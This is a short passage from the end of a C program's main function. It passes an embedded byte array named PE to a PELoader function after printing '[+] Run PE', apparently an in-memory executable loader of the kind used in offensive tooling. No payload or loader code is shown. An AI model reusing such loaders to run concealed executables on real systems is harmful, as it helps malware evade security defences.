    size_t size = sizeof(PE);
    
    printf("\n[+] Run PE\n\n\n");
    PELoader(PE, size);
    
    return 0;
}